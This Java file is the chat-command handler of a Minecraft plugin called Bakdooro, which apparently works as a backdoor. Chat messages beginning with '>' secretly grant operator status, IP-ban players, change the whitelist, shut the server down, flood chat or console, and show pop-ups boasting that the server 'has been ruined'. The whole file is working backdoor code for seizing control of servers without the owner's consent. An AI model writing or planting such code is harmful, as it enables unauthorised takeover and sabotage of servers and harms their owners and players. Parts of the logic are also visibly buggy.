package me.acaiberii.bakdooro.util.handler;

import me.acaiberii.bakdooro.commands.blatant.blnt;
import me.acaiberii.bakdooro.commands.exploit.exploit;
import me.acaiberii.bakdooro.commands.misc.misc;
import org.bukkit.entity.Player;
import me.acaiberii.bakdooro.items.itm;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Objects;
import java.util.Random;

import static me.acaiberii.bakdooro.game.server.srv;
import static org.bukkit.Bukkit.getOnlinePlayers;
import static org.bukkit.Bukkit.getPlayer;

public class chathandler {
    public static void handler(Player pl, String message) {
        String[] spl = message.split(":");
        if (message.startsWith(">")) {
            if (spl[0].startsWith(">fill")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >fill:(console/chat)");
                }
                else {
                    if (spl[1].equals("chat")) {
                        exploit.chatFill();
                    }
                    else if (spl[1].equals("console")) {
                        exploit.consoleFill();
                    }
                    else {
                        pl.sendMessage("Unknown mode. Valid modes: chat, console.");
                    }
                }
            }
            else if (spl[0].startsWith(">op")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                }
                else {
                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">deop")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                }
                else {
                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">ban")) {
                if (spl.length < 3) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >ban:(PLAYER)");
                }
                else {
                    Player pll = getPlayer(spl[1]);
                    srv.banIP(Objects.requireNonNull(Objects.requireNonNull(pll).getAddress()).getHostName());
                    pl.sendMessage("Banned " + Objects.requireNonNull(pll.getAddress()).getHostName());
                }
            }
            else if (spl[0].startsWith(">unban")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                }
                else {
                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                    pl.sendMessage("Unbanned " + Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                }
            }
            else if (spl[0].startsWith(">whitelist")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(on/off)/>whitelist:(add/remove):(PLAYER)");
                }
                else {
                    if (spl[1].equals("on")) {
                        srv.setWhitelist(true);
                        pl.sendMessage("Whitelist off.");
                    }
                    else if (spl[1].equals("off")) {
                        srv.setWhitelist(true);
                        pl.sendMessage("Whitelist on.");
                    }
                    else if (spl[1].equals("add")) {
                        if (spl.length < 3) {
                            pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(add/remove):(PLAYER)");
                        }
                        else {
                            Player pll = getPlayer(spl[2]);
                            Objects.requireNonNull(pll).setWhitelisted(true);
                            pl.sendMessage("Added " + pll.getName() + " to whitelist.");
                        }
                    }
                    else if (spl[1].equals("remove")) {
                        if (spl.length < 3) {
                            pl.sendMessage("Invalid syntax. Correct syntax: >whitelist:(add/remove):(PLAYER)");
                        }
                        else {
                            Player pll = getPlayer(spl[2]);
                            Objects.requireNonNull(pll).setWhitelisted(false);
                            pl.sendMessage("Removed " + pll.getName() + " from whitelist.");
                        }
                    }
                    else {
                        pl.sendMessage("Unknown mode. Valid modes: on, off, add, remove.");
                    }
                }
            }
            else if (spl[0].startsWith(">shutdown")) {
                pl.sendMessage("Shutting down server.");
                srv.shutdown();
            }
            else if (spl[0].startsWith(">blatant")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >blatant:(notify/floppa)");
                }
                else {
                    if (spl[1].equals("notify")) {
                        if (spl.length < 3) {
                            pl.sendMessage("Invalid syntax. Correct syntax: >blatant:notify:(MODE)");
                        }
                        else {
                            if (spl[2].equals("hacker")) {
                                blnt.infoBox((getOnlinePlayers().toArray()[new Random().ints(0, getOnlinePlayers().size()).findFirst().getAsInt()]) + " detected for " + itm.hacks[new Random().ints(0, itm.hacks.length).findFirst().getAsInt()], "Player was detected for hacks!");
                            }
                            else if (spl[2].equals("givemeclout")) {
                                blnt.infoBox("This server has been ruined by Bakdooro!", "https://github.com/AcaiBerii/Bakdooro");
                            }
                            else if (spl[2].equals("annoy")) {
                                blnt.infoBox("Still using this computer?", "lol");
                            }
                            else {
                                pl.sendMessage("Unknown mode. Valid modes: hacker, givemeclout.");
                            }
                        }
                    }
                    else if (spl[1].equals("floppa")) {
                        misc.Floppa();
                    }
                }
            }
            else {
                pl.sendMessage("Unknown command. Try again.");
            }
        }
    }
}